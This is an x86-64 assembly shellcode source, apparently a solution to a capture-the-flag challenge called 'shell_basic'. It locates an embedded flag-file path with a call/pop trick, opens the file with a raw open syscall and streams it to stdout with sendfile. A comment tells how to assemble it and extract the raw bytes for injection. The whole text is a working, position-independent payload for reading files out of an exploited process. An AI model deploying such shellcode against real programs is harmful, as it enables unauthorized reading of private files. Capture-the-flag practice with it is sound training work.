.intel_syntax noprefix
.global _start
_start:

# Assemble with `gcc` and extract .text section with `objcopy`
call code
.asciz "/home/shell_basic/flag_name_is_loooooong"
code:
pop rdi
xor esi, esi
mov eax, 2
syscall

mov edi, 1
mov esi, eax
xor edx, edx
mov r10, 100
mov eax, 40
syscall
